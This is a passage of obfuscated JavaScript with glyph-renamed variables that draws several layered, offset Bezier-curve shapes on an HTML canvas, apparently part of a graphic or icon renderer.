			Δ.bezierCurveTo(ᐃ * 223.51138305664062, 50.267059326171875 * ᐃ, ᐃ * 223.51138305664062, ᐃ * 50.267059326171875, 222.01138305664062 * ᐃ, ᐃ * 19.767059326171875);
			Δ.bezierCurveTo(ᐃ * 219.01138305664062, ᐃ * 8.767059326171875, ᐃ * 224.01138305664062, ᐃ * 4.767059326171875, ᐃ * 227.01138305664062, ᐃ * 2.767059326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠⲆΔ;
			Δ.translate(ᐃΔΔ, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 142.01138305664062, 25.767059326171875 * ᐃ);
			Δ.bezierCurveTo(158.51138305664062 * ᐃ, ᐃ * 19.767059326171875, ᐃ * 158.51138305664062, 19.767059326171875 * ᐃ, ᐃ * 175.01138305664062, 13.767059326171875 * ᐃ);
			Δ.bezierCurveTo(188.01138305664062 * ᐃ, 11.767059326171875 * ᐃ, 188.01138305664062 * ᐃ, 16.767059326171875 * ᐃ, ᐃ * 191.01138305664062, 29.767059326171875 * ᐃ);
			Δ.bezierCurveTo(197.01138305664062 * ᐃ, 60.267059326171875 * ᐃ, ᐃ * 197.01138305664062, ᐃ * 60.267059326171875, ᐃ * 203.01138305664062, 90.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 206.01138305664062, ᐃ * 102.76705932617188, 196.01138305664062 * ᐃ, 99.76705932617188 * ᐃ, 181.01138305664062 * ᐃ, ᐃ * 105.76705932617188);
			Δ.bezierCurveTo(175.01138305664062 * ᐃ, ᐃ * 108.76705932617188, 172.01138305664062 * ᐃ, ᐃ * 104.76705932617188, 164.01138305664062 * ᐃ, 84.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152.51138305664062, 63.267059326171875 * ᐃ, ᐃ * 152.51138305664062, ᐃ * 63.267059326171875, 141.01138305664062 * ᐃ, ᐃ * 41.767059326171875);
			Δ.bezierCurveTo(ᐃ * 138.01138305664062, 35.767059326171875 * ᐃ, ᐃ * 138.01138305664062, 29.767059326171875 * ᐃ, 141.01138305664062 * ᐃ, 27.767059326171875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[0], 12 * ᐃ);
			Δ.globalAlpha = ⵠᐃⵠΔ;
			Δ.translate(ⵠᐃⲆᐃ, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(142.01138305664062 * ᐃ, ᐃ * 25.767059326171875);
			Δ.bezierCurveTo(158.51138305664062 * ᐃ, 19.767059326171875 * ᐃ, ᐃ * 158.51138305664062, ᐃ * 19.767059326171875, ᐃ * 175.01138305664062, 13.767059326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 188.01138305664062, ᐃ * 11.767059326171875, ᐃ * 188.01138305664062, 16.767059326171875 * ᐃ, 191.01138305664062 * ᐃ, ᐃ * 29.767059326171875);
			Δ.bezierCurveTo(ᐃ * 197.01138305664062, 60.267059326171875 * ᐃ, 197.01138305664062 * ᐃ, 60.267059326171875 * ᐃ, 203.01138305664062 * ᐃ, 90.76705932617188 * ᐃ);
			Δ.bezierCurveTo(206.01138305664062 * ᐃ, ᐃ * 102.76705932617188, ᐃ * 196.01138305664062, 99.76705932617188 * ᐃ, ᐃ * 181.01138305664062, ᐃ * 105.76705932617188);
			Δ.bezierCurveTo(175.01138305664062 * ᐃ, 108.76705932617188 * ᐃ, 172.01138305664062 * ᐃ, 104.76705932617188 * ᐃ, ᐃ * 164.01138305664062, 84.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152.51138305664062, ᐃ * 63.267059326171875, ᐃ * 152.51138305664062, 63.267059326171875 * ᐃ, 141.01138305664062 * ᐃ, ᐃ * 41.767059326171875);
			Δ.bezierCurveTo(138.01138305664062 * ᐃ, 35.767059326171875 * ᐃ, 138.01138305664062 * ᐃ, 29.767059326171875 * ᐃ, 141.01138305664062 * ᐃ, ᐃ * 27.767059326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆᐃᐃⲆ], 12 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ᐃ * ⲆΔⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 70.01138305664062, ᐃ * 76.76705932617188);
			Δ.bezierCurveTo(ᐃ * 83.01138305664062, ᐃ * 64.26705932617188, ᐃ * 83.01138305664062, 64.26705932617188 * ᐃ, ᐃ * 96.01138305664062, 51.767059326171875 * ᐃ);
			Δ.bezierCurveTo(104.01138305664062 * ᐃ, ᐃ * 44.767059326171875, ᐃ * 110.01138305664062, ᐃ * 51.767059326171875, 119.01138305664062 * ᐃ, 66.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135.01138305664062, 88.26705932617188 * ᐃ, 135.01138305664062 * ᐃ, ᐃ * 88.26705932617188, ᐃ * 151.01138305664062, 109.76705932617188 * ᐃ);
			Δ.bezierCurveTo(157.01138305664062 * ᐃ, 119.76705932617188 * ᐃ, ᐃ * 153.01138305664062, 122.76705932617188 * ᐃ, ᐃ * 147.01138305664062, ᐃ * 129.76705932617188);
			Δ.bezierCurveTo(138.01138305664062 * ᐃ, ᐃ * 140.76705932617188, 136.01138305664062 * ᐃ, 140.76705932617188 * ᐃ, ᐃ * 122.01138305664062, 127.76705932617188 * ᐃ);
			Δ.bezierCurveTo(99.51138305664062 * ᐃ, ᐃ * 110.26705932617188, ᐃ * 99.51138305664062, 110.26705932617188 * ᐃ, 77.01138305664062 * ᐃ, 92.76705932617188 * ᐃ);
			Δ.bezierCurveTo(66.01138305664062 * ᐃ, 83.76705932617188 * ᐃ, 66.01138305664062 * ᐃ, ᐃ * 82.76705932617188, ᐃ * 69.01138305664062, 78.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[ᐃⵠΔ], 12 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(0, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(70.01138305664062 * ᐃ, 76.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 83.01138305664062, ᐃ * 64.26705932617188, 83.01138305664062 * ᐃ, 64.26705932617188 * ᐃ, ᐃ * 96.01138305664062, 51.767059326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104.01138305664062, ᐃ * 44.767059326171875, 110.01138305664062 * ᐃ, 51.767059326171875 * ᐃ, ᐃ * 119.01138305664062, ᐃ * 66.76705932617188);
			Δ.bezierCurveTo(ᐃ * 135.01138305664062, ᐃ * 88.26705932617188, 135.01138305664062 * ᐃ, ᐃ * 88.26705932617188, 151.01138305664062 * ᐃ, ᐃ * 109.76705932617188);
			Δ.bezierCurveTo(157.01138305664062 * ᐃ, 119.76705932617188 * ᐃ, 153.01138305664062 * ᐃ, 122.76705932617188 * ᐃ, 147.01138305664062 * ᐃ, ᐃ * 129.76705932617188);
			Δ.bezierCurveTo(138.01138305664062 * ᐃ, ᐃ * 140.76705932617188, ᐃ * 136.01138305664062, ᐃ * 140.76705932617188, ᐃ * 122.01138305664062, ᐃ * 127.76705932617188);
			Δ.bezierCurveTo(99.51138305664062 * ᐃ, ᐃ * 110.26705932617188, ᐃ * 99.51138305664062, 110.26705932617188 * ᐃ, 77.01138305664062 * ᐃ, ᐃ * 92.76705932617188);
			Δ.bezierCurveTo(ᐃ * 66.01138305664062, 83.76705932617188 * ᐃ, ᐃ * 66.01138305664062, 82.76705932617188 * ᐃ, ᐃ * 69.01138305664062, ᐃ * 78.76705932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⵠΔΔ], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(0, ⲆΔΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 33.011383056640625, ᐃ * 126.76705932617188);
			Δ.bezierCurveTo(22.011383056640625 * ᐃ, 149.76705932617188 * ᐃ, ᐃ * 22.011383056640625, 149.76705932617188 * ᐃ, ᐃ * 11.011383056640625, 172.76705932617188 * ᐃ);
			Δ.bezierCurveTo(7.011383056640625 * ᐃ, 184.76705932617188 * ᐃ, 11.011383056640625 * ᐃ, ᐃ * 189.76705932617188, ᐃ * 36.011383056640625, 195.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 61.011383056640625, ᐃ * 202.26705932617188, ᐃ * 61.011383056640625, ᐃ * 202.26705932617188, ᐃ * 86.01138305664062, 208.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 100.01138305664062, 214.76705932617188 * ᐃ, 102.01138305664062 * ᐃ, 203.76705932617188 * ᐃ, ᐃ * 109.01138305664062, 189.76705932617188 * ᐃ);
			Δ.bezierCurveTo(117.01138305664062 * ᐃ, ᐃ * 171.76705932617188, ᐃ * 116.01138305664062, 166.76705932617188 * ᐃ, 97.01138305664062 * ᐃ, ᐃ * 156.76705932617188);
			Δ.bezierCurveTo(74.01138305664062 * ᐃ, 140.76705932617188 * ᐃ, ᐃ * 74.01138305664062, 140.76705932617188 * ᐃ, ᐃ * 51.011383056640625, 124.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 42.011383056640625, ᐃ * 118.76705932617188, 37.011383056640625 * ᐃ, 119.76705932617188 * ᐃ, ᐃ * 33.011383056640625, 126.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 12 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(Ⲇᐃⵠⵠ, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 33.011383056640625, ᐃ * 126.76705932617188);
			Δ.bezierCurveTo(22.011383056640625 * ᐃ, ᐃ * 149.76705932617188, 22.011383056640625 * ᐃ, ᐃ * 149.76705932617188, 11.011383056640625 * ᐃ, ᐃ * 172.76705932617188);
			Δ.bezierCurveTo(7.011383056640625 * ᐃ, ᐃ * 184.76705932617188, ᐃ * 11.011383056640625, ᐃ * 189.76705932617188, 36.011383056640625 * ᐃ, 195.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 61.011383056640625, 202.26705932617188 * ᐃ, 61.011383056640625 * ᐃ, ᐃ * 202.26705932617188, ᐃ * 86.01138305664062, 208.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 100.01138305664062, ᐃ * 214.76705932617188, ᐃ * 102.01138305664062, ᐃ * 203.76705932617188, 109.01138305664062 * ᐃ, ᐃ * 189.76705932617188);
			Δ.bezierCurveTo(ᐃ * 117.01138305664062, ᐃ * 171.76705932617188, ᐃ * 116.01138305664062, ᐃ * 166.76705932617188, ᐃ * 97.01138305664062, ᐃ * 156.76705932617188);
			Δ.bezierCurveTo(ᐃ * 74.01138305664062, ᐃ * 140.76705932617188, ᐃ * 74.01138305664062, ᐃ * 140.76705932617188, ᐃ * 51.011383056640625, ᐃ * 124.76705932617188);
			Δ.bezierCurveTo(42.011383056640625 * ᐃ, 118.76705932617188 * ᐃ, 37.011383056640625 * ᐃ, ᐃ * 119.76705932617188, 33.011383056640625 * ᐃ, ᐃ * 126.76705932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⲆⵠⲆⲆ;
			Δ.translate(ᐃΔΔ, 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(13.011383056640625 * ᐃ, ᐃ * 229.76705932617188);
			Δ.bezierCurveTo(45.511383056640625 * ᐃ, 233.76705932617188 * ᐃ, ᐃ * 45.511383056640625, 233.76705932617188 * ᐃ, 78.01138305664062 * ᐃ, ᐃ * 237.76705932617188);
			Δ.bezierCurveTo(92.01138305664062 * ᐃ, 239.76705932617188 * ᐃ, ᐃ * 92.01138305664062, 246.76705932617188 * ᐃ, 91.01138305664062 * ᐃ, 257.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 92.01138305664062, 275.7670593261719 * ᐃ, ᐃ * 91.01138305664062, 274.7670593261719 * ᐃ, ᐃ * 68.01138305664062, 276.7670593261719 * ᐃ);
			Δ.bezierCurveTo(42.511383056640625 * ᐃ, 279.7670593261719 * ᐃ, ᐃ * 42.511383056640625, 279.7670593261719 * ᐃ, ᐃ * 17.011383056640625, 282.7670593261719 * ᐃ);
			Δ.bezierCurveTo(2.011383056640625 * ᐃ, 282.7670593261719 * ᐃ, ᐃ * 3.011383056640625, 276.7670593261719 * ᐃ, ᐃ * 2.011383056640625, 260.7670593261719 * ᐃ);
			Δ.bezierCurveTo(2.011383056640625 * ᐃ, ᐃ * 231.76705932617188, ᐃ * 4.011383056640625, 232.76705932617188 * ᐃ, 11.011383056640625 * ᐃ, 230.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⵠⲆⲆⲆᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃⵠΔ, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 13.011383056640625, 229.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45.511383056640625, 233.76705932617188 * ᐃ, 45.511383056640625 * ᐃ, 233.76705932617188 * ᐃ, ᐃ * 78.01138305664062, 237.76705932617188 * ᐃ);
			Δ.bezierCurveTo(92.01138305664062 * ᐃ, 239.76705932617188 * ᐃ, 92.01138305664062 * ᐃ, ᐃ * 246.76705932617188, 91.01138305664062 * ᐃ, ᐃ * 257.7670593261719);
			Δ.bezierCurveTo(92.01138305664062 * ᐃ, 275.7670593261719 * ᐃ, ᐃ * 91.01138305664062, 274.7670593261719 * ᐃ, ᐃ * 68.01138305664062, ᐃ * 276.7670593261719);
			Δ.bezierCurveTo(ᐃ * 42.511383056640625, ᐃ * 279.7670593261719, 42.511383056640625 * ᐃ, ᐃ * 279.7670593261719, 17.011383056640625 * ᐃ, ᐃ * 282.7670593261719);
			Δ.bezierCurveTo(ᐃ * 2.011383056640625, 282.7670593261719 * ᐃ, ᐃ * 3.011383056640625, 276.7670593261719 * ᐃ, ᐃ * 2.011383056640625, ᐃ * 260.7670593261719);
			Δ.bezierCurveTo(2.011383056640625 * ᐃ, ᐃ * 231.76705932617188, ᐃ * 4.011383056640625, 232.76705932617188 * ᐃ, ᐃ * 11.011383056640625, 230.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ], Ⲇᐃ[2], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃⵠⲆⵠ, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(97.01138305664062 * ᐃ, 329.7670593261719 * ᐃ);
			Δ.bezierCurveTo(68.51138305664062 * ᐃ, ᐃ * 343.7670593261719, ᐃ * 68.51138305664062, 343.7670593261719 * ᐃ, 40.011383056640625 * ᐃ, ᐃ * 357.7670593261719);
			Δ.bezierCurveTo(29.011383056640625 * ᐃ, ᐃ * 360.7670593261719, ᐃ * 27.011383056640625, 361.7670593261719 * ᐃ, 20.011383056640625 * ᐃ, ᐃ * 346.7670593261719);
			Δ.bezierCurveTo(16.511383056640625 * ᐃ, 336.2670593261719 * ᐃ, ᐃ * 16.511383056640625, 336.2670593261719 * ᐃ, ᐃ * 13.011383056640625, ᐃ * 325.7670593261719);
			Δ.bezierCurveTo(ᐃ * 10.011383056640625, 307.7670593261719 * ᐃ, 18.011383056640625 * ᐃ, 312.7670593261719 * ᐃ, ᐃ * 34.011383056640625, 306.7670593261719 * ᐃ);
			Δ.bezierCurveTo(59.511383056640625 * ᐃ, ᐃ * 302.2670593261719, ᐃ * 59.511383056640625, 302.2670593261719 * ᐃ, ᐃ * 85.01138305664062, 297.7670593261719 * ᐃ);
			Δ.bezierCurveTo(97.01138305664062 * ᐃ, ᐃ * 294.7670593261719, ᐃ * 100.01138305664062, 297.7670593261719 * ᐃ, 100.01138305664062 * ᐃ, 307.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 105.01138305664062, 326.7670593261719 * ᐃ, ᐃ * 103.01138305664062, ᐃ * 325.7670593261719, 97.01138305664062 * ᐃ, ᐃ * 329.7670593261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⲆΔⵠ], ᐃ * 12);
			Δ.globalAlpha = ⲆⵠⲆⲆ;
			Δ.translate(ⵠᐃⲆᐃ, ᐃ * -ΔΔᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(97.01138305664062 * ᐃ, ᐃ * 329.7670593261719);
			Δ.bezierCurveTo(68.51138305664062 * ᐃ, ᐃ * 343.7670593261719, ᐃ * 68.51138305664062, ᐃ * 343.7670593261719, ᐃ * 40.011383056640625, 357.7670593261719 * ᐃ);
			Δ.bezierCurveTo(29.011383056640625 * ᐃ, ᐃ * 360.7670593261719, ᐃ * 27.011383056640625, ᐃ * 361.7670593261719, 20.011383056640625 * ᐃ, 346.7670593261719 * ᐃ);
			Δ.bezierCurveTo(16.511383056640625 * ᐃ, ᐃ * 336.2670593261719, ᐃ * 16.511383056640625, 336.2670593261719 * ᐃ, 13.011383056640625 * ᐃ, ᐃ * 325.7670593261719);
			Δ.bezierCurveTo(10.011383056640625 * ᐃ, 307.7670593261719 * ᐃ, 18.011383056640625 * ᐃ, 312.7670593261719 * ᐃ, 34.011383056640625 * ᐃ, ᐃ * 306.7670593261719);
			Δ.bezierCurveTo(59.511383056640625 * ᐃ, ᐃ * 302.2670593261719, ᐃ * 59.511383056640625, 302.2670593261719 * ᐃ, ᐃ * 85.01138305664062, 297.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.01138305664062, 294.7670593261719 * ᐃ, 100.01138305664062 * ᐃ, ᐃ * 297.7670593261719, ᐃ * 100.01138305664062, ᐃ * 307.7670593261719);
			Δ.bezierCurveTo(ᐃ * 105.01138305664062, 326.7670593261719 * ᐃ, 103.01138305664062 * ᐃ, 325.7670593261719 * ᐃ, 97.01138305664062 * ᐃ, 329.7670593261719 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ], Ⲇᐃ[2], ᐃᐃΔᐃⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⵠ;
			Δ.translate(0, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(394.0113830566406 * ᐃ, 181.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 426.5113830566406, ᐃ * 166.76705932617188, 426.5113830566406 * ᐃ, ᐃ * 166.76705932617188, 459.0113830566406 * ᐃ, 151.76705932617188 * ᐃ);
			Δ.bezierCurveTo(469.0113830566406 * ᐃ, 152.76705932617188 * ᐃ, 469.0113830566406 * ᐃ, 155.76705932617188 * ᐃ, 472.0113830566406 * ᐃ, 165.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 476.0113830566406, 177.26705932617188 * ᐃ, 476.0113830566406 * ᐃ, 177.26705932617188 * ᐃ, ᐃ * 480.0113830566406, ᐃ * 188.76705932617188);
			Δ.bezierCurveTo(ᐃ * 483.0113830566406, 199.76705932617188 * ᐃ, 480.0113830566406 * ᐃ, 200.76705932617188 * ᐃ, 460.0113830566406 * ᐃ, 205.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 433.5113830566406, 210.26705932617188 * ᐃ, ᐃ * 433.5113830566406, ᐃ * 210.26705932617188, 407.0113830566406 * ᐃ, 214.76705932617188 * ᐃ);
			Δ.bezierCurveTo(395.0113830566406 * ᐃ, 218.76705932617188 * ᐃ, 397.0113830566406 * ᐃ, 211.76705932617188 * ᐃ, ᐃ * 393.0113830566406, ᐃ * 202.76705932617188);
			Δ.bezierCurveTo(387.0113830566406 * ᐃ, ᐃ * 188.76705932617188, ᐃ * 387.0113830566406, ᐃ * 187.76705932617188, 394.0113830566406 * ᐃ, ᐃ * 181.76705932617188);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[ΔᐃΔΔ], ᐃ * 12);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(394.0113830566406 * ᐃ, 181.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 426.5113830566406, 166.76705932617188 * ᐃ, ᐃ * 426.5113830566406, ᐃ * 166.76705932617188, ᐃ * 459.0113830566406, ᐃ * 151.76705932617188);
			Δ.bezierCurveTo(ᐃ * 469.0113830566406, 152.76705932617188 * ᐃ, 469.0113830566406 * ᐃ, 155.76705932617188 * ᐃ, ᐃ * 472.0113830566406, ᐃ * 165.76705932617188);
			Δ.bezierCurveTo(476.0113830566406 * ᐃ, ᐃ * 177.26705932617188, 476.0113830566406 * ᐃ, 177.26705932617188 * ᐃ, ᐃ * 480.0113830566406, ᐃ * 188.76705932617188);
			Δ.bezierCurveTo(483.0113830566406 * ᐃ, ᐃ * 199.76705932617188, 480.0113830566406 * ᐃ, ᐃ * 200.76705932617188, ᐃ * 460.0113830566406, 205.76705932617188 * ᐃ);
			Δ.bezierCurveTo(433.5113830566406 * ᐃ, ᐃ * 210.26705932617188, ᐃ * 433.5113830566406, 210.26705932617188 * ᐃ, 407.0113830566406 * ᐃ, 214.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 395.0113830566406, ᐃ * 218.76705932617188, 397.0113830566406 * ᐃ, ᐃ * 211.76705932617188, ᐃ * 393.0113830566406, 202.76705932617188 * ᐃ);
			Δ.bezierCurveTo(387.0113830566406 * ᐃ, ᐃ * 188.76705932617188, 387.0113830566406 * ᐃ, ᐃ * 187.76705932617188, ᐃ * 394.0113830566406, 181.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃⲆ], Ⲇᐃ[2], ᐃ * 12);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 411.0113830566406, 234.76705932617188 * ᐃ);
			Δ.bezierCurveTo(446.0113830566406 * ᐃ, ᐃ * 233.26705932617188, ᐃ * 446.0113830566406, 233.26705932617188 * ᐃ, ᐃ * 481.0113830566406, 231.76705932617188 * ᐃ);
			Δ.bezierCurveTo(491.0113830566406 * ᐃ, ᐃ * 232.76705932617188, ᐃ * 493.0113830566406, ᐃ * 239.76705932617188, 491.0113830566406 * ᐃ, 251.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 490.0113830566406, 263.7670593261719 * ᐃ, ᐃ * 490.0113830566406, ᐃ * 263.7670593261719, ᐃ * 489.0113830566406, 275.7670593261719 * ᐃ);
			Δ.bezierCurveTo(487.0113830566406 * ᐃ, 283.7670593261719 * ᐃ, 483.0113830566406 * ᐃ, ᐃ * 284.7670593261719, 464.0113830566406 * ᐃ, ᐃ * 280.7670593261719);
			Δ.bezierCurveTo(ᐃ * 437.0113830566406, 273.7670593261719 * ᐃ, ᐃ * 437.0113830566406, ᐃ * 273.7670593261719, ᐃ * 410.0113830566406, 266.7670593261719 * ᐃ);
			Δ.bezierCurveTo(400.0113830566406 * ᐃ, ᐃ * 261.7670593261719, ᐃ * 401.0113830566406, ᐃ * 259.7670593261719, 402.0113830566406 * ᐃ, ᐃ * 249.76705932617188);
			Δ.bezierCurveTo(401.0113830566406 * ᐃ, ᐃ * 237.76705932617188, 403.0113830566406 * ᐃ, ᐃ * 235.76705932617188, 408.0113830566406 * ᐃ, 234.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ], Ⲇᐃ[0], 12 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(411.0113830566406 * ᐃ, ᐃ * 234.76705932617188);
			Δ.bezierCurveTo(446.0113830566406 * ᐃ, ᐃ * 233.26705932617188, 446.0113830566406 * ᐃ, 233.26705932617188 * ᐃ, 481.0113830566406 * ᐃ, 231.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 491.0113830566406, ᐃ * 232.76705932617188, 493.0113830566406 * ᐃ, 239.76705932617188 * ᐃ, ᐃ * 491.0113830566406, 251.76705932617188 * ᐃ);
			Δ.bezierCurveTo(490.0113830566406 * ᐃ, 263.7670593261719 * ᐃ, 490.0113830566406 * ᐃ, ᐃ * 263.7670593261719, ᐃ * 489.0113830566406, ᐃ * 275.7670593261719);
			Δ.bezierCurveTo(487.0113830566406 * ᐃ, 283.7670593261719 * ᐃ, ᐃ * 483.0113830566406, 284.7670593261719 * ᐃ, 464.0113830566406 * ᐃ, 280.7670593261719 * ᐃ);
			Δ.bezierCurveTo(437.0113830566406 * ᐃ, ᐃ * 273.7670593261719, 437.0113830566406 * ᐃ, 273.7670593261719 * ᐃ, 410.0113830566406 * ᐃ, 266.7670593261719 * ᐃ);
			Δ.bezierCurveTo(400.0113830566406 * ᐃ, ᐃ * 261.7670593261719, 401.0113830566406 * ᐃ, ᐃ * 259.7670593261719, ᐃ * 402.0113830566406, ᐃ * 249.76705932617188);
			Δ.bezierCurveTo(401.0113830566406 * ᐃ, ᐃ * 237.76705932617188, ᐃ * 403.0113830566406, ᐃ * 235.76705932617188, ᐃ * 408.0113830566406, 234.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], 12 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(400.0113830566406 * ᐃ, ᐃ * 290.7670593261719);
			Δ.bezierCurveTo(437.0113830566406 * ᐃ, 301.2670593261719 * ᐃ, ᐃ * 437.0113830566406, 301.2670593261719 * ᐃ, 474.0113830566406 * ᐃ, 311.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 484.0113830566406, ᐃ * 319.7670593261719, ᐃ * 481.0113830566406, ᐃ * 322.7670593261719, ᐃ * 474.0113830566406, 335.7670593261719 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 465.5113830566406, ᐃ * 354.7670593261719, 465.5113830566406 * ᐃ, 354.7670593261719 * ᐃ, ᐃ * 457.0113830566406, 373.7670593261719 * ᐃ);
			Δ.bezierCurveTo(449.0113830566406 * ᐃ, ᐃ * 386.7670593261719, 444.0113830566406 * ᐃ, ᐃ * 384.7670593261719, 427.0113830566406 * ᐃ, ᐃ * 370.7670593261719);
			Δ.bezierCurveTo(403.0113830566406 * ᐃ, ᐃ * 354.7670593261719, ᐃ * 403.0113830566406, 354.7670593261719 * ᐃ, 379.0113830566406 * ᐃ, ᐃ * 338.7670593261719);
			Δ.bezierCurveTo(ᐃ * 371.0113830566406, ᐃ * 327.7670593261719, 373.0113830566406 * ᐃ, ᐃ * 323.7670593261719, ᐃ * 377.0113830566406, ᐃ * 313.7670593261719);
			Δ.bezierCurveTo(386.0113830566406 * ᐃ, ᐃ * 292.7670593261719, ᐃ * 393.0113830566406, 288.7670593261719 * ᐃ, 398.0113830566406 * ᐃ, ᐃ * 291.7670593261719);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -ⵠᐃΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(400.0113830566406 * ᐃ, 290.7670593261719 * ᐃ);
